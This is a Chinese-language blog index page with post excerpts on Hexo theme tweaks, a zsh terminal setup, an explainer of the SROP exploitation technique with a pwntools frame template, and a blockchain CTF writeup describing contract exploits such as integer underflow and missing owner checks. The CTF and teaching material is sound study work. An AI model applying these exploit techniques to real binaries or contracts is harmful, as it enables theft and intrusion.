<p>這個主題整體來說很好看的，但是我不喜歡他的排版，文章只能擠在中間細細長長的，左右兩邊還留了很多空隙，不知道是作者的螢幕太小還是我螢幕太大，所以我把所有 widget 都移到左邊，然後把欄位的比例改成 3:9，css 的部份在 <code>source/css/style.styl:21</code> 把寬度調寬</p>
<figure class="highlight plaintext"><figcaption><span>layout/layout.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">case 2:</span><br><span class="line">    return &#x27;is-9-tablet is-9-desktop is-9-widescreen&#x27;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><figcaption><span>layout/common/widget.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">case 2:</span><br><span class="line">    return &#x27;is-3-tablet is-3-desktop is-3-widescreen&#x27;;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><figcaption><span>source/css/style.styl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gap</span> = <span class="number">40px</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: screen-widescreen)</span><br><span class="line">    .is-<span class="number">1</span>-column .container</span><br><span class="line">    .is-<span class="number">2</span>-column .container</span><br><span class="line">        <span class="attribute">max-width</span>: screen-widescreen - <span class="number">2</span> * gap</span><br><span class="line">        <span class="attribute">width</span>: screen-widescreen - <span class="number">2</span> * gap</span><br><span class="line">@media screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: screen-fullhd)</span><br><span class="line">    .is-<span class="number">2</span>-column .container</span><br><span class="line">        <span class="attribute">max-width</span>: screen-fullhd - <span class="number">2</span> * gap</span><br><span class="line">        <span class="attribute">width</span>: screen-fullhd - <span class="number">2</span> * gap</span><br><span class="line">    .is-<span class="number">1</span>-column .container</span><br><span class="line">        <span class="attribute">max-width</span>: screen-fullhd - <span class="number">2</span> * gap</span><br><span class="line">        <span class="attribute">width</span>: screen-fullhd - <span class="number">2</span> * gap</span><br></pre></td></tr></table></figure>
<h2 id="Read-More">Read More</h2>
<p>原本 <a target="_blank" rel="noopener" href="https://blog.zhangruipeng.me/hexo-theme-icarus/">icarus</a> 只有 excerpt 這個選項可以加在文章的 front-matter 中，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;部落格開發日誌&quot;</span><br><span class="line">excerpt: 寫一些摘要在這邊</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>但是要每一篇都要自己寫摘要好麻煩，我比較想要的是只顯示固定長度，然後邊邊模糊處理，所以就自己手刻了一個</p>
<figure class="highlight plaintext"><figcaption><span>layout/common/article.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;card &lt;%= index &amp;&amp; (!post.hasOwnProperty(&#x27;readmore&#x27;) || post.readmore) ? &#x27;card-readmore&#x27; : &#x27;&#x27; %&gt;&quot;&gt;</span><br><span class="line">...</span><br><span class="line">    &lt;% if (index &amp;&amp; (!post.hasOwnProperty(&#x27;readmore&#x27;) || post.readmore)) &#123; %&gt;</span><br><span class="line">        &lt;div class=&quot;level is-mobile readmore-button&quot;&gt;</span><br><span class="line">            ...</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><figcaption><span>source/css/style.styl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.card-readmore</span></span><br><span class="line">    <span class="attribute">max-height</span>: <span class="number">400px</span></span><br><span class="line">    overflow: hidden</span><br><span class="line">    position: relative</span><br><span class="line">    .readmore-button</span><br><span class="line">        position absolute</span><br><span class="line">        left: <span class="number">0</span></span><br><span class="line">        bottom: <span class="number">20px</span></span><br><span class="line">        width: <span class="number">100%</span></span><br><span class="line">        display: flex</span><br><span class="line">        justify-content center</span><br><span class="line">        z-index: <span class="number">20</span></span><br><span class="line">    &amp;:after</span><br><span class="line">        content: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        position: absolute</span><br><span class="line">        bottom: <span class="number">60px</span></span><br><span class="line">        width: <span class="number">100%</span></span><br><span class="line">        height: <span class="number">100px</span></span><br><span class="line">        z-index: <span class="number">10</span></span><br><span class="line">        background-image: <span class="built_in">linear-gradient</span>(to bottom, <span class="built_in">hsla</span>(<span class="number">0</span>, <span class="number">100%</span>, <span class="number">100%</span>, <span class="number">0</span>), <span class="built_in">hsla</span>(<span class="number">0</span>, <span class="number">100%</span>, <span class="number">100%</span>, <span class="number">0.9</span>))</span><br><span class="line">    &amp;:before</span><br><span class="line">        content: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        position: absolute</span><br><span class="line">        bottom: <span class="number">0</span></span><br><span class="line">        width: <span class="number">100%</span></span><br><span class="line">        height: <span class="number">60px</span></span><br><span class="line">        z-index: <span class="number">10</span></span><br><span class="line">        background-image: <span class="built_in">linear-gradient</span>(to bottom, <span class="built_in">hsla</span>(<span class="number">0</span>, <span class="number">100%</span>, <span class="number">100%</span>, <span class="number">0.9</span>), <span class="built_in">hsla</span>(<span class="number">0</span>, <span class="number">100%</span>, <span class="number">100%</span>, <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<h2>Adblock</h2>
<p>我本身有在用 AdBlock，然後在用 <a target="_blank" rel="noopener" href="https://blog.zhangruipeng.me/hexo-theme-icarus/">icarus</a> 主題的時候發現有些物件會憑空消失，比如 back-to-top 那個按了可以回到頁面頂端的小按鈕，後來發現是被 AdBlock 砍了，因為那個小按鈕有 <code>.back-to-top</code> 這個 class，不只 <code>.back-to-top</code> 還有很多關鍵字會被砍，可以看這份 <a target="_blank" rel="noopener" href="https://gist.github.com/spyesx/42fe84c0ef757d1c38a4">Class and ID to avoid because of AdBlock</a>，那我的解決辦法就是把原始碼裡所有的 back-to-top 改名成 bottom-to-top</p>
<p>就在剛剛，我寫完第一段之後，發現上面的 h2 標題 Adblock 因為 markdown 生成 html 時自動加了 <code>id=Adblock</code>，然後就被 AdBlock 砍了，只好改成自己手刻 html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Adblock<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>另一個被砍掉的是 font-awesome 的 icon <code>.fa-instagram</code>，這個就不好改名了，所以我加了一小行 javascript 把 <code>.fa-ig</code> 改成 <code>.fa-instagram</code>，以結果來看我的 script 跑的順序應該是比 AdBlock 來得後面所以沒有被砍</p>
<figure class="highlight javascript"><figcaption><span>source/js/main.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;.fa-ig&#x27;</span>).<span class="title function_">addClass</span>(<span class="string">&#x27;fa-instagram&#x27;</span>);</span><br><span class="line">    $(<span class="string">&#x27;.fa-ig&#x27;</span>).<span class="title function_">removeClass</span>(<span class="string">&#x27;fa-ig&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="Github">Github</h2>
<p><a target="_blank" rel="noopener" href="https://github.com/squidfunk/mkdocs-material">mkdocs-material</a> 主題的右上角有顯示 github star 的功能，我覺得很酷，所以就搬過來了</p>
<figure class="highlight plaintext"><figcaption><span>layout/common/navbar.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class=&quot;navbar-item github-source&quot; href=&quot;&lt;%= github.url %&gt;&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;github-source-icon&quot;&gt;&lt;i class=&quot;fab fa-lg fa-github-alt&quot;&gt;&lt;/i&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;github-source-repository&quot;&gt;</span><br><span class="line">        &lt;%= github.name %&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><figcaption><span>source/css/style.styl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.github-source</span></span><br><span class="line">    <span class="selector-class">.github-source-icon</span></span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">5px</span></span><br><span class="line">    .github-source-repository</span><br><span class="line">        padding-left: <span class="number">10px</span></span><br><span class="line">        font-size: <span class="number">10px</span></span><br><span class="line">        font-weight: <span class="number">1000</span></span><br><span class="line">        ul</span><br><span class="line">            animation: animateElement linear .<span class="number">3s</span>;</span><br><span class="line">            <span class="attribute">animation-iteration-count</span>: <span class="number">1</span>;</span><br><span class="line">            <span class="selector-tag">li</span> </span><br><span class="line">                <span class="attribute">float</span>: left</span><br><span class="line">                font-weight: <span class="number">200</span></span><br><span class="line">            #github-forks</span><br><span class="line">                margin-left: <span class="number">3px</span></span><br><span class="line"></span><br><span class="line">@keyframes animateElement&#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transform</span>:  <span class="built_in">translate</span>(<span class="number">0px</span>,<span class="number">10px</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>:<span class="number">1</span>;</span><br><span class="line">    <span class="attribute">transform</span>:  <span class="built_in">translate</span>(<span class="number">0px</span>,<span class="number">0px</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><figcaption><span>source/js/main.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> (<span class="title class_">IcarusThemeSettings</span>) !== <span class="string">&#x27;undefined&#x27;</span> &amp;&amp;</span><br><span class="line">    <span class="keyword">typeof</span> (<span class="title class_">IcarusThemeSettings</span>.<span class="property">github</span>.<span class="property">url</span>) !== <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="title class_">IcarusThemeSettings</span>.<span class="property">github</span>.<span class="property">url</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(url)</span><br><span class="line">    <span class="keyword">const</span> matches = <span class="regexp">/^.+github\.com\/([^/]+)\/?([^/]+)?.*$/</span>.<span class="title function_">exec</span>(url)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(matches)</span><br><span class="line">    <span class="keyword">if</span> (matches &amp;&amp; matches.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> [, user, name] = matches</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(user, name)</span><br><span class="line">        <span class="keyword">const</span> api = <span class="string">`https://api.github.com/users/<span class="subst">$&#123;user&#125;</span>/repos`</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">paginate</span> = (<span class="params">page = <span class="number">0</span></span>) =&gt; (</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;api&#125;</span>?per_page=100&amp;sort=updated&amp;page=<span class="subst">$&#123;page&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(data <span class="keyword">instanceof</span> <span class="title class_">Array</span>))</span><br><span class="line">                    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Display number of stars and forks, if repository is given */</span></span><br><span class="line">                <span class="keyword">if</span> (name) &#123;</span><br><span class="line">                    <span class="keyword">const</span> repo = data.<span class="title function_">find</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">name</span> === name)</span><br><span class="line">                    <span class="keyword">if</span> (!repo &amp;&amp; data.<span class="property">length</span> === <span class="number">30</span>) <span class="keyword">return</span> <span class="title function_">paginate</span>(page + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> repo.<span class="property">stargazers_count</span> !== <span class="string">&#x27;number&#x27;</span> || <span class="keyword">typeof</span> repo.<span class="property">forks_count</span> !== <span class="string">&#x27;number&#x27;</span>) <span class="keyword">return</span> []</span><br><span class="line">                    <span class="comment">/* If we found a repo, extract the facts */</span></span><br><span class="line">                    <span class="keyword">return</span> repo</span><br><span class="line">                    ? [</span><br><span class="line">                        <span class="string">`<span class="subst">$&#123;repo.stargazers_count&#125;</span> Stars`</span>,</span><br><span class="line">                        <span class="string">`<span class="subst">$&#123;repo.forks_count&#125;</span> Forks`</span></span><br><span class="line">                    ]</span><br><span class="line">                    : []</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Display number of repositories, otherwise */</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> [</span><br><span class="line">                    <span class="string">`<span class="subst">$&#123;data.length&#125;</span> Repositories`</span></span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        )</span><br><span class="line">        <span class="title function_">paginate</span>().<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">            <span class="keyword">const</span> [stars, forks] = data</span><br><span class="line">            <span class="keyword">const</span> facts = $(<span class="string">`&lt;ul class=&quot;github-facts&quot;&gt;&lt;li id=&quot;github-stars&quot;&gt;<span class="subst">$&#123;stars&#125;</span>&lt;/li&gt;&lt;li id=&quot;github-forks&quot;&gt;• <span class="subst">$&#123;forks&#125;</span>&lt;/li&gt;&lt;/ul&gt;`</span>)</span><br><span class="line">            $(<span class="string">&#x27;.github-source-repository&#x27;</span>).<span class="title function_">append</span>(facts)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="舊部落格">舊部落格</h2>
<p><a href="/old/">舊的部落格</a>我還在慢慢搬移當中，所以我把 mkdocs 生成的 html 放進來 hexo 當 static files，只要放在 <code>source/old/</code> 底下然後在 <code>_config.yml</code> 裡面加一行 <code>skip_render: old/**</code>，hexo 就不會去 render 他了</p>
<h2 id="疑難雜症-2">疑難雜症</h2>
<p>在改主題原始碼的過程中，遇到各種奇怪問題時，記得先 <code>hexo clean</code> 一下</p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/01/23/blog00/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-01-17T16:00:00.000Z" title="1/18/2020, 12:00:00 AM">2020-01-18</time></span><i class="material-icons">schedule</i><span class="level-item">5 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/01/18/terminal/">【一秒變時尚】zimfw + powerlevel10k + nord</a></h1><div class="content"><h2 id="Zimfw"><a target="_blank" rel="noopener" href="https://github.com/zimfw/zimfw">Zimfw</a></h2>
<p>我也是用了很久的 <a target="_blank" rel="noopener" href="https://github.com/ohmyzsh/ohmyzsh">oh-my-zsh</a>，一直都覺得 terminal 有點慢，不過直到看到這篇 <a target="_blank" rel="noopener" href="https://www.jkg.tw/?p=2876">打造屬於你自己的極速 Shell「iTerm + zsh + zim + powerlevel10k」</a>，才有想要換的念頭</p>
<p><a target="_blank" rel="noopener" href="https://github.com/zimfw/zimfw">zimfw</a> 的優點就是快，雖然他不像 <a target="_blank" rel="noopener" href="https://github.com/ohmyzsh/ohmyzsh">oh-my-zsh</a> 一樣有<a target="_blank" rel="noopener" href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins">這麼多內建的插件</a>，但一般的 zsh 插件他也都可以安裝，而且最常用也一定要有的 <code>zsh-syntax-highlight</code>, <code>zsh-completions</code>, <code>zsh-autosuggestions</code> 預設都幫你配置好了，其他插件的安裝請看下面的說明</p>
<h3 id="插件安裝">插件安裝</h3>
<p>官方提供的插件<a target="_blank" rel="noopener" href="https://github.com/zimfw/zimfw/wiki/Modules">在這</a>，archive 預設沒裝，我推薦可以安裝，他跟 <a target="_blank" rel="noopener" href="https://github.com/ohmyzsh/ohmyzsh">oh-my-zsh</a> 的 <a target="_blank" rel="noopener" href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/extract">extract</a> 插件是同樣的功能，會自動幫你根據副檔名解壓縮，就不需要再去背那些指令</p>
<p>非官方的插件的話，我們以 <a target="_blank" rel="noopener" href="https://github.com/djui/alias-tips">alias-tips</a> 這個插件做例子，只要在 <code>.zimrc</code> 加入下面一行</p>
<figure class="highlight bash"><figcaption><span>.zimrc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmodule djui/alias-tips</span><br></pre></td></tr></table></figure>
<p>然後打 <code>zimfw install</code>，他就會去幫你 git clone 那個 repo 下來，接著在載入插件的時候會去找 <code>&#123;init.zsh|module_name.&#123;zsh|plugin.zsh|zsh-theme|sh&#125;&#125;</code> 這個格式的檔名，只要找得到這樣的檔案的 github repo 基本上都可以安裝</p>
<h2 id="Powerlevel10k"><a target="_blank" rel="noopener" href="https://github.com/romkatv/powerlevel10k">Powerlevel10k</a></h2>
<p><a target="_blank" rel="noopener" href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a> 看名字就知道是用來幹掉 <a target="_blank" rel="noopener" href="https://github.com/Powerlevel9k/powerlevel9k">powerlevel9k</a> 的，記得當初看到 <a target="_blank" rel="noopener" href="https://github.com/Powerlevel9k/powerlevel9k">powerlevel9k</a> 的時候兩眼發光，此生沒看過這麼漂亮的主題，直到現在看到 <a target="_blank" rel="noopener" href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a> powerlevel9k，那 <a target="_blank" rel="noopener" href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a> 究竟是猛在哪，就我來看，我覺得 <a target="_blank" rel="noopener" href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a> 最大的優點在於他優秀的客製化系統，請看下圖</p>
<p align="center"><img data-src="/images/powerlevel10k.gif" class=" lazyload"  title="powerlevel10k 設定畫面"></p>
<p>可以讓你一步步設定每個細節，而且不用自己手動去改設定，只要跑 <code>p10k configure</code> 這個指令就好，對懶人十分的友善阿，而且 <a target="_blank" rel="noopener" href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a> 直接推薦我們安裝 <code>MesloLGS NF</code> 字型，裝好就完事了，不需要像 <a target="_blank" rel="noopener" href="https://github.com/Powerlevel9k/powerlevel9k">powerlevel9k</a> 還要自己調字型和大小，另一個優點就是速度了，官方說是比 powerlevel9k 快上不少，但是因為我同時也換了 zimfw 所以不知道是不是真的有變快</p>
<h2 id="Nord"><a target="_blank" rel="noopener" href="https://www.nordtheme.com/">Nord</a></h2>
<p>顏色的配置我使用 Nord 這款，有冰天雪地高冷的感覺，我把他套用到 <a target="_blank" rel="noopener" href="https://sw.kovidgoyal.net/kitty/">kitty</a>, vim, tmux 上，讓整個環境有一致的色調，十分舒服，請看下圖，安裝的部分可以到 <a target="_blank" rel="noopener" href="https://github.com/arcticicestudio?tab=repositories">官方的 github</a> 裡面去找，各大常見的編輯器幾乎都有支援</p>
<p align="center"><img data-src="/images/nord.gif" class=" lazyload"  title="nord 顏色配置效果"></p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/01/18/terminal/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2019-09-17T16:00:00.000Z" title="9/18/2019, 12:00:00 AM">2019-09-18</time></span><i class="material-icons">schedule</i><span class="level-item">2 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/pwn/">pwn</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/09/18/srop/">【攻擊手法】SROP</a></h1><div class="content"><p>SROP 是 Sigreturn Oriented Programming 的縮寫</p>
<h2 id="Signal">Signal</h2>
<p>一支程式接到 signal 後</p>
<ol>
<li>kernel 會幫你把上下文 ( 各種暫存器 ) 保留到 stack 上，叫做 Signal Frame</li>
<li>跳回 user mode，讓 signal handler 處理</li>
<li>signal handler 處理完會 return 回 <code>__restore_rt</code>，這個 function 裡面就是 <code>mov rax, 0xf; syscall</code>，去呼叫 <code>sys_rt_sigreturn</code> syscall，把上下文恢復 Signal Frame</li>
</ol>
<h2 id="SigReturn-ROP">SigReturn ROP</h2>
<p>在做 ROP 的時候需要設定許多暫存器的值<br>
這時候就可以用 SROP 的技巧<br>
自己在 stack 上擺好 Signal Frame，然後呼叫 <code>sys_rt_sigreturn</code> syscall<br>
就可以一次設定好所有的暫存器<br>
缺點是需要夠大的空間塞下整個 Signal Frame</p>
<h2 id="sys-rt-sigreturn-syscall-gadget"><code>sys_rt_sigreturn</code> syscall gadget</h2>
<p>哪裡有 <code>mov rax, 0xf; syscall</code> 的 gadget 可以用</p>
<ol>
<li>libc 裡面的 <code>__restore_rt</code></li>
<li>自己用 ROP 設定好 rax, 再接 syscall gadget</li>
</ol>
<h2 id="pwntools-SigFrame">pwntools <code>SigFrame</code></h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = <span class="number">0</span></span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">rop = <span class="built_in">bytes</span>(frame)</span><br></pre></td></tr></table></figure>
<h2 id="CTF-題目">CTF 題目</h2>
<p><a target="_blank" rel="noopener" href="http://pwnable.kr">pwnable.kr - unexploitable</a></p>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.slideshare.net/AngelBoy1/sigreturn-ori">https://www.slideshare.net/AngelBoy1/sigreturn-ori</a></li>
<li><a target="_blank" rel="noopener" href="http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/">http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2019/09/18/srop/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2019-06-06T16:00:00.000Z" title="6/7/2019, 12:00:00 AM">2019-06-07</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/06/07/blockchain-ctf/">【CTF Writeups】Security Innovation Blockchain CTF</a></h1><div class="content"><p>這邊是紀錄我寫 <a target="_blank" rel="noopener" href="https://blockchain-ctf.securityinnovation.com/#/">Security Innovation Blockchain CTF</a> 的 Writeups</p>
<h2 id="Donation">Donation</h2>
<p>這題是簽到題<br>
就只是讓我們呼叫合約裡面的這個函式 <code>withdrawDonationsFromTheSuckersWhoFellForIt</code></p>
<h2 id="Lock-Box">Lock Box</h2>
<p>這題有個 <code>private</code> 的 <code>pin</code> 變數，但是 <code>private</code> 只是代表那個變數沒有 <code>getter</code> 函式，把合約的狀態抓下來就看光光啦<br>
使用 <a target="_blank" rel="noopener" href="https://web3js.readthedocs.io/en/1.0/web3-eth.html#eth-getstorageat"><code>web3.eth.getStorageAt</code></a> 這個函式<br>
父合約的變數會在子合約的變數的前面<br>
所以 position 0 的位址是 <code>authorizedToPlay</code>，而 position 1 的位址就是 <code>pin</code><br>
變數在 storage 裡面怎麼擺的可以參考這篇 <a target="_blank" rel="noopener" href="https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/">Understanding Ethereum Smart Contract Storage</a></p>
<h2 id="Piggy-Bank">Piggy Bank</h2>
<p>這題直接呼叫 <code>collectFunds</code> 就好了<br>
只有 <code>PiggyBank</code> 的 <code>collectFunds</code> 有 <code>onlyOwner</code>，<code>CharliesPiggyBank</code> 的 <code>collectFunds</code> 沒有 <code>onlyOwner</code></p>
<h2 id="SI-Token-Sale">SI Token Sale</h2>
<p>這題的 <code>purchaseTokens</code> 沒有用 SafeMath，也沒有檢查 <code>_value</code> 要大於 <code>feeAmount</code><br>
先轉個 <code>0.000001</code> 給合約，這樣 <code>0.000001 - 0.00001</code> 就會 underflow 變成很大的數字，就得到了超多的 token<br>
然後再用 <code>refundTokens</code> 就可以半價把 token 換成 ether 錢錢了</p>
<h2 id="Secure-Bank">Secure Bank</h2>
<p><code>SecureBank</code> 的 <code>withdraw</code> 和 <code>MembersBank</code> 的 <code>withdraw</code> 其中的 <code>_value</code> 參數形態不一樣<br>
他們會被看成是不一樣的函式，所以會有兩個不一樣的型態 <code>withdraw</code> 可以呼叫<br>
而 <code>MembersBank</code> 的 <code>withdraw</code> 沒有檢查是不是本人，所以就直接把 contract creator 的錢領走</p>
<h2 id="Lottery">Lottery</h2>
<p>這題要猜 <code>entropy^entropy2</code> 的值，猜到就可以拿走裡面的錢錢</p>
